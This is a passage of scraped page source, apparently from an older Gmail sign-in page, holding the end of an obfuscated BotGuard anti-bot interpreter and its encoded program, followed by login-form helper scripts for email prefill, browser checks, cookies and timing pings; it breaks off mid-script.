window?window:O),Y(d,d.H,0),Y(d,d.U,0),Y(d,d.u,[]),Y(d,d.i,d.i),Y(d,110,function(x,d,Q){d=C(x),Q=C(x),Y(x,Q,x.c(Q)*x.c(d))}),Y(d,32,function(x,d,Q,e){d=C(x),Q=C(x),e=C(x),Y(x,e,x.c(d)>>Q)}),Y(d,22,function(x,d,Q,e){d=C(x),Q=C(x),e=C(x),x.c(d)[x.c(Q)]=x.c(e)}),Y(d,28,function(x,d,Q,e,U,N,p,b,S,B){if(d=C(x),Q=T(x),e="",void 0!=x.G[x.R])for(U=x.c(x.R),p=U.length,N=0;Q--;)N=(N+T(x))%p,e+=U[N];else{for(e=Array(Q),U=0;U<Q;U++)e[U]=C(x);for(Q=[],N=U=0;U<e.length;)p=e[U++],128>p?Q[N++]=String.fromCharCode(p):191<p&&224>p?(b=e[U++],Q[N++]=String.fromCharCode((p&31)<<6|b&63)):239<p&&365>p?(b=e[U++],S=e[U++],B=e[U++],p=((p&7)<<18|(b&63)<<12|(S&63)<<6|B&63)-65536,Q[N++]=String.fromCharCode(55296+(p>>10)),Q[N++]=String.fromCharCode(56320+(p&1023))):(b=e[U++],S=e[U++],Q[N++]=String.fromCharCode((p&15)<<12|(b&63)<<6|S&63));e=Q.join("")}Y(x,d,e)}),Y(d,46,function(d,c,e,F,U,N){if(c=C(d),e=C(d),F=C(d),U=C(d),c=d.c(c),e=d.c(e),F=d.c(F),d=d.c(U),"object"==K(c)){for(N in U=[],c)U.push(N);c=U}for(U=0,N=c.length;U<N;U+=F)e(c.slice(U,U+F),d)}),Y(d,84,function(d,c){c=l(d),Y(d,c.S,c.o.apply(c.M,c.s))}),Y(d,60,function(d,c,e,F){c=C(d),e=C(d),F=C(d),e=d.c(e),c=d.c(c),Y(d,F,c[e])}),Y(d,24,function(d,c,e,F){c=C(d),e=C(d),F=d.c(C(d)),e=d.c(e),Y(d,c,A(d,e,F))}),Y(d,96,function(d,e,Q){e=C(d),Q=C(d),Y(d,Q,""+d.c(e))}),Y(d,72,function(){}),Y(d,57,function(d,e){e=C(d),d=d.c(e),d[0].removeEventListener(d[1],d[2],false)}),Y(d,126,function(){}),Y(d,2,function(d,e,Q,F){if(e=d.A.pop()){for(Q=C(d);0<Q;Q--)F=C(d),e[F]=d.G[F];e[d.X]=d.G[d.X],d.G=e}else Y(d,d.I,d.N.length)}),Y(d,81,function(d,e,Q){e=C(d),Q=C(d),Y(d,Q,d.c(Q)-d.c(e))}),Y(d,93,function(d){J(d,3)}),Y(d,67,function(d,e,Q,F,U,N,p){e=l(d),U=e.o,F=e.M,Q=e.s,p=Q.length,0==p?N=new F[U]:1==p?N=new F[U](Q[0]):2==p?N=new F[U](Q[0],Q[1]):3==p?N=new F[U](Q[0],Q[1],Q[2]):4==p?N=new F[U](Q[0],Q[1],Q[2],Q[3]):d.g(d.m),Y(d,e.S,N)}),Y(d,20,function(d,e,Q){e=C(d),Q=C(d),Y(d,Q,d.c(Q)%d.c(e))}),Y(d,37,function(d,e,Q,F,U){for(e=C(d),Q=T(d),F=Array(Q),U=0;U<Q;U++)F[U]=C(d);Y(d,e,F)}),Y(d,87,function(d,e,Q,F){e=C(d),Q=C(d),F=C(d),Y(d,F,(d.c(e)in d.c(Q))+0)}),Y(d,99,function(d){G(d,2)}),Y(d,79,function(d){J(d,7)}),Y(d,112,function(d,e,Q){e=C(d),Q=C(d),Y(d,Q,function(d){return eval(d)}(d.c(e)))}),Y(d,62,function(d,e,Q){e=C(d),Q=C(d),0!=d.c(e)&&Y(d,d.I,d.c(Q))}),Y(d,50,function(d,e,Q,F){e=C(d),Q=C(d),F=C(d),Y(d,F,d.c(e)<<Q)}),Y(d,26,function(d){G(d,4)}),Y(d,40,function(d){z(d,2)}),Y(d,108,function(d,e,Q,F){e=C(d),Q=C(d),F=C(d),Y(d,F,d.c(e)||d.c(Q))}),Y(d,66,function(d){J(d,4)}),Y(d,114,function(d){J(d,0)}),Y(d,21,function(d,e,Q,F){e=C(d),Q=C(d),F=C(d),d.c(e)>d.c(Q)&&Y(d,F,d.c(F)+1)}),Y(d,80,function(d,e,Q){e=C(d),Q=C(d),Y(d,Q,d.c(Q)+d.c(e))}),Y(d,59,function(d,e,Q,F){e=C(d),Q=C(d),F=C(d),d.c(e)==d.c(Q)&&Y(d,F,d.c(F)+1)}),Y(d,52,function(d){z(d,4)}),Y(d,65,function(d,e,Q,F,U){e=C(d),Q=C(d),F=C(d),e=d.c(e),U=d.c(C(d)),Q=d.c(Q),F=d.c(F),0!==e&&(F=A(d,F,U,e),e.addEventListener(Q,F,false),Y(d,d.H,[e,Q,F]))}),Y(d,73,function(d,e,Q){e=C(d),Q=C(d),e=d.G[e]&&d.c(e),Y(d,Q,e)}),Y(d,95,function(d){G(d,1)}),Y(d,88,function(){}),Y(d,12,function(d,e,Q){e=C(d),Q=C(d),e=d.c(e),Y(d,Q,K(e))}),Y(d,51,function(d,e){e=d.c(C(d)),M(d,e)}),Y(d,105,function(d){z(d,1)}),Y(d,9,function(d,e,Q,F){e=C(d),Q=C(d),F=C(d),Y(d,F,d.c(e)|d.c(Q))}),w(),e&&"!"==e.charAt(0)?d.w=e:(d.N=window.atob?g(window.atob(e)):null,d.N&&d.N.length?(d.A=[],d.l()):d.g(d.V))},r=function(d,e,x,c){if(8192>=d.length)return String.fromCharCode.apply(null,d);for(x=0,e="";x<d.length;x+=8192)c=u(d,x,x+8192),e+=String.fromCharCode.apply(null,c);return e},f=function(d,e,x,c){return x=d.c(d.I),d.N&&x<d.N.length?(Y(d,d.I,d.N.length),M(d,e)):Y(d,d.I,e),c=d.l(),Y(d,d.I,x),c},Y=function(d,e,x){if(e==d.I||e==d.$)if(d.G[e])d.G[e][d.L](x);else d.G[e]=P(d,x);else if(e!=d.a&&e!=d.C&&e!=d.X||!d.G[e])d.G[e]=q(x,d.c);e==d.U&&(d.J=void 0,Y(d,d.I,d.c(d.I)+4))},w=function(d){for(d=0;64>d;++d);},I=function(d,e,x,c,Q){for(e=[],c=x=0;c<d.length;c++)Q=d.charCodeAt(c),128>Q?e[x++]=Q:(2048>Q?e[x++]=Q>>6|192:(55296==(Q&64512)&&c+1<d.length&&56320==(d.charCodeAt(c+1)&64512)?(Q=65536+((Q&1023)<<10)+(d.charCodeAt(++c)&1023),e[x++]=Q>>18|240,e[x++]=Q>>12&63|128):e[x++]=Q>>12|224,e[x++]=Q>>6&63|128),e[x++]=Q&63|128);return e},n=function(d){try{X(this,d)}catch(e){R(this,e)}},v=(n.prototype.c=function(d,e){if(e=this.G[d],void 0===e)throw this.g(this.Z,0,d),this.j;return e()},function(d,e,x,c,Q,F){for(Q=d.c(e),e=e==d.C?function(e,x,c,F){if(x=Q.length,c=x-4>>3,Q.iD!=c){Q.iD=c,c=(c<<3)-4,F=[0,0,0,d.c(d.T)];try{Q.qt=L(h(Q,c),h(Q,c+4),F)}catch(S){throw S;}}Q.push(Q.qt[x&7]^e)}:function(d){Q.push(d)},c&&e(c&255),F=0,c=x.length;F<c;F++)e(x[F])}),R=(D=n.prototype,D.GO=249,function(d,e){d.w=("E:"+e.message+":"+e.stack).slice(0,2048)}),T=function(d,e){return e=C(d),e&128&&(e=e&127|C(d)<<7),e},h=function(d,e){return d[e]<<24|d[e+1]<<16|d[e+2]<<8|d[e+3]},l=(D.$=173,D.Nt=15,D.cT=145,function(d,e,x,c,Q,F){for(e={},x=C(d),e.S=C(d),e.s=[],c=C(d)-1,Q=C(d),F=0;F<c;F++)e.s.push(C(d));for(e.o=d.c(x),e.M=d.c(Q);c--;)e.s[c]=d.c(e.s[c]);return e}),P=(D.O=36,D.H=219,D.V=17,D.Y=233,function(d,e,x,c){return c=function(){return e},x=function(){return c()},x[d.L]=function(d){e=d},x}),m=(D.u=129,function(d,e,x,c){for(c=e-1,x=[];0<=c;c--)x[e-1-c]=d>>8*c&255;return x}),E=(D.v=134,D.gX=153,D.kU=10,D.K=170,D.B=191,D.U=176,n.prototype.$U=function(d,e,x,c){if(3==d.length){for(x=0;3>x;x++)e[x]+=d[x];for(x=0,c=[13,8,13,12,16,5,3,10,15];9>x;x++)e[3](e,x%3,c[x])}},D.I=149,D.P="caller",function(d,e){for(e=Array(d);d--;)e[d]=255*Math.random()|0;return e}),L=(D.C=237,function(d,e,x,c){try{for(c=0;79669387488!=c;)d+=(e<<4^e>>>5)+e^c+x[c&3],c+=2489668359,e+=(d<<4^d>>>5)+d^c+x[c>>>11&3];return[d>>>24,d>>16&255,d>>8&255,d&255,e>>>24,e>>16&255,e>>8&255,e&255]}catch(Q){throw Q;}}),A=(D.X=155,function(d,e,x,c){return function(){if(!c||d.b)return Y(d,d.IW,arguments),Y(d,d.v,x),f(d,e)}}),M=(D.Z=30,D.L="toString",D.IW=217,D.j={},D.T=133,D.W=33,D.a=236,n.prototype.g=function(d,e,x,c){c=this.c(this.$),d=[d,c>>8&255,c&255],void 0!=x&&d.push(x),0==this.c(this.X).length&&(this.G[this.X]=void 0,Y(this,this.X,d)),x="",e&&(e.message&&(x+=e.message),e.stack&&(x+=":"+e.stack)),e=this.c(this.B),3<e&&(x=x.slice(0,e-3),e-=x.length+3,x=I(x.replace(/\\r\\n/g,"\\n")),v(this,this.C,m(x.length,2).concat(x),this.aW)),Y(this,this.B,e)},D.h=21,D.CE=false,function(d,e){d.A.push(d.G.slice()),d.G[d.I]=void 0,Y(d,d.I,e)}),C=(D.X6=34,function(d,e,x){if(e=d.c(d.I),!(e in d.N))throw d.g(d.F),d.j;return void 0==d.J&&(d.J=h(d.N,e-4),d.f=void 0),d.f!=e>>3&&(d.f=e>>3,x=[0,0,0,d.c(d.U)],d.rX=L(d.J,d.f,x)),Y(d,d.I,e+1),d.N[e]^d.rX[e%8]}),g=(D.i=143,n.prototype.nE=function(d,e){e.push(d[0]<<24|d[1]<<16|d[2]<<8|d[3]),e.push(d[4]<<24|d[5]<<16|d[6]<<8|d[7]),e.push(d[8]<<24|d[9]<<16|d[10]<<8|d[11])},n.prototype.Em=function(d,e,x,c){try{c=d[(e+2)%3],d[e]=d[e]-d[(e+1)%3]-c^(1==e?c<<x:c>>>x)}catch(Q){throw Q;}},D.F=31,D.aW=12,D.m=22,D.R=187,D=n.prototype,function(d,e,x,c,Q){for(e=[],c=x=0;c<d.length;c++){for(Q=d.charCodeAt(c);255<Q;)e[x++]=Q&255,Q>>=8;e[x++]=Q}return e}),J=(D.sm=function(d){return(d=window.performance)&&d.now?function(){return d.now()|0}:function(){return+new Date}}(),function(d,e,x,c,Q,F){c=e&3,x=e&4,Q=C(d),F=C(d),Q=d.c(Q),x&&(Q=I((""+Q).replace(/\\r\\n/g,"\\n"))),c&&v(d,F,m(Q.length,2)),v(d,F,Q)}),z=function(d,e,x,c){for(x=C(d),c=0;0<e;e--)c=c<<8|C(d);Y(d,x,c)},G=(D.BT=function(d,e){return e=this.D(),d&&d(e),e},function(d,e,x,c){x=C(d),c=C(d),v(d,c,m(d.c(x),e))});D.LE=function(d,e,x){return e^=e<<13,e^=e>>17,(e=(e^e<<5)&x)||(e=1),d^e},D.D=function(d,e,x,c,Q,F,U,N,p,b){if(this.w)return this.w;try{if(this.b=false,e=this.c(this.a).length,x=this.c(this.C).length,c=this.c(this.B),this.G[this.Y]&&f(this,this.c(this.Y)),Q=this.c(this.X),0<Q.length&&v(this,this.a,m(Q.length,2).concat(Q),this.Nt),F=this.c(this.K)&511,F-=this.c(this.a).length+5,U=this.c(this.C),4<U.length&&(F-=U.length+3),0<F&&v(this,this.a,m(F,2).concat(E(F)),this.kU),4<U.length&&v(this,this.a,m(U.length,2).concat(U),this.gX),N=E(2).concat(this.c(this.a)),N[1]=N[0]^3,p=window.btoa?window.btoa(r(N)).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,""):void 0,p)p="!"+p;else for(Q=0,p="";Q<N.length;Q++)b=N[Q][this.L](16),1==b.length&&(b="0"+b),p+=b;this.c(this.a).length=e,this.c(this.C).length=x,Y(this,this.B,c),d=p,this.b=true}catch(S){R(this,S),d=this.w}return d},D.PT=function(d,e,x,c,Q,F){for(x=[],F=c=0;F<d.length;F++)for(Q=Q<<e|d[F],c+=e;7<c;)c-=8,x.push(Q>>c&255);return x},D.l=function(d,e,x,c,Q,F){try{for(c=0,e=5001,x=void 0,d=this.N.length;(--e||this.CE)&&(c=this.c(this.I))<d;)try{Y(this,this.$,c),Q=C(this),(x=this.c(Q))&&x.call?x(this):this.g(this.h,0,Q)}catch(U){U!=this.j&&(F=this.c(this.i),F!=this.i?(Y(this,F,U),Y(this,this.i,this.i)):this.g(this.m,U))}e||this.g(this.W)}catch(U){try{this.g(this.m,U)}catch(N){R(this,N)}}return this.c(this.v)},D.wX=function(d,e,x,c,Q){for(Q=c=0;Q<d.length;Q++)c+=d.charCodeAt(Q),c+=c<<10,c^=c>>6;return c+=c<<3,c^=c>>11,d=c+(c<<15)>>>0,c=new Number(d&(1<<e)-1),c[0]=(d>>>e)%x,c};try{window.addEventListener("unload",function(){},false)}catch(d){}V("botguard.bg",n),V("botguard.bg.prototype.invoke",n.prototype.BT);')})()</script>
  <script type="text/javascript">
  document.bg = new botguard.bg('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');
  </script>
<script>
  gaia = window.gaia || {};
  gaia.ps = gaia.ps || {};
  gaia.ps.hasPrefilledIdentifier = false;
  function gaia_parseFragment() {
  var hash = location.hash;
  var params = {};
  if (!hash) {
  return params;
  }
  var paramStrs = decodeURIComponent(hash.substring(1)).split('&');
  for (var i = 0; i < paramStrs.length; i++) {
      var param = paramStrs[i].split('=');
      params[param[0]] = param[1];
    }
    return params;
  }

  function gaia_prefillEmail() {
    var email = null;
    var form = null;
    if (document.getElementById) {
      email = document.getElementById('Email');
      form = document.getElementById('gaia_loginform');
    }
    if (form && email && (email.value == null || email.value == '')
        && (email.type != 'hidden')) {
      hashParams = gaia_parseFragment();
      if (hashParams['Email'] && hashParams['Email'] != '') {
        email.value = hashParams['Email'];
        
      }
    }
  }

  
  try {
    gaia_prefillEmail();
  } catch (e) {
  }
  
</script>
<script>
  var gaia_scrollToElement = function(element) {
  var calculateOffsetHeight = function(element) {
  var curtop = 0;
  if (element.offsetParent) {
  while (element) {
  curtop += element.offsetTop;
  element = element.offsetParent;
  }
  }
  return curtop;
  }
  var siginOffsetHeight = calculateOffsetHeight(element);
  var scrollHeight = siginOffsetHeight - window.innerHeight +
  element.clientHeight + 0.02 * window.innerHeight;
  window.scroll(0, scrollHeight);
  }
</script>
<script type="text/javascript">
var BrowserSupport_={IsBrowserSupported:function(){var agt=navigator.userAgent.toLowerCase();var is_op=agt.indexOf("opera")!=-1;var is_ie=agt.indexOf("msie")!=-1&&document.all&&!is_op;var is_ie5=agt.indexOf("msie 5")!=-1&&document.all&&!is_op;var is_mac=agt.indexOf("mac")!=-1;var is_gk=agt.indexOf("gecko")!=-1;var is_sf=agt.indexOf("safari")!=-1;if(is_ie&&!is_op&&!is_mac){if(agt.indexOf("palmsource")!=
-1||agt.indexOf("regking")!=-1||agt.indexOf("windows ce")!=-1||agt.indexOf("j2me")!=-1||agt.indexOf("avantgo")!=-1||agt.indexOf(" stb")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"msie ");if(v!=null)return v>=5.5}if(is_gk&&!is_sf){var v=BrowserSupport_.GetFollowingFloat(agt,"rv:");if(v!=null)return v>=1.4;else{v=BrowserSupport_.GetFollowingFloat(agt,"galeon/");if(v!=null)return v>=
1.3}}if(is_sf){if(agt.indexOf("rv:3.14.15.92.65")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"applewebkit/");if(v!=null)return v>=312}if(is_op){if(agt.indexOf("sony/com1")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"opera ");if(v==null)v=BrowserSupport_.GetFollowingFloat(agt,"opera/");if(v!=null)return v>=8}if(agt.indexOf("pda; sony/com2")!=-1)return true;return false},
GetFollowingFloat:function(str,pfx){var i=str.indexOf(pfx);if(i!=-1){var v=parseFloat(str.substring(i+pfx.length));if(!isNaN(v))return v}return null}};var is_browser_supported=BrowserSupport_.IsBrowserSupported()
  </script>
<script type=text/javascript>
<!--

var start_time = (new Date()).getTime();

if (top.location != self.location) {
 top.location = self.location.href;
}

function SetGmailCookie(name, value) {
  document.cookie = name + "=" + value + ";path=/;domain=.google.com";
}

function lg() {
  var now = (new Date()).getTime();

  var cookie = "T" + start_time + "/" + start_time + "/" + now;
  SetGmailCookie("GMAIL_LOGIN", cookie);
}

function StripParam(url, param) {
  var start = url.indexOf(param);
  if (start == -1) return url;
  var end = start + param.length;

  var charBefore = url.charAt(start-1);
  if (charBefore != '?' && charBefore != '&') return url;

  var charAfter = (url.length >= end+1) ? url.charAt(end) : '';
  if (charAfter != '' && charAfter != '&' && charAfter != '#') return url;
  if (charBefore == '&') {
  --start;
  } else if (charAfter == '&') {
  ++end;
  }
  return url.substring(0, start) + url.substring(end);
}
var fixed = 0;
function FixForm() {
  if (is_browser_supported) {
  var form = el("gaia_loginform");
  if (form && form["continue"]) {
  var url = form["continue"].value;
  url = StripParam(url, "ui=html");
  url = StripParam(url, "zy=l");
  form["continue"].value = url;
  }
  }
  fixed = 1;
}
function el(id) {
  if (document.getElementById) {
  return document.getElementById(id);
  } else if (window[id]) {
  return window[id];
  }
  return null;
}
// Estimates of nanite storage generation over time.
var CP = [
 [ 1224486000000, 7254 ],
 [ 1335290400000, 7704 ],
 [ 1335376800000, 10240 ],
 [ 2144908800000, 13531 ],
 [ 2147328000000, 43008 ],
 [ 46893711600000, Number.MAX_VALUE ]
];
var quota_elem;
var ONE_PX = "https://mail.google.com/mail/images/cleardot.gif?t=" +
  (new Date()).getTime();
function LogRoundtripTime() {
  var img = new Image();
  var start = (new Date()).getTime();
  img.onload = GetRoundtripTimeFunction(start);
  img.src = ONE_PX;
}
function GetRoundtripTimeFunction(start) {
  return function() {
  var end = (new Date()).getTime();
  SetGmailCookie("GMAIL_RTT", (end - start));
  }
}
function MaybePingUser() {
  var f = el("gaia_loginform");
  if (f.Email.value) {
  new Image().src = 'https://mail.google.com/mail/gxlu?email=' +
  encodeURIComponent(f.Email.value) +
  '&zx=' + (new Date().getTime());
  }
}
var passwd_elem = el("Passwd");
if (passwd_elem) {
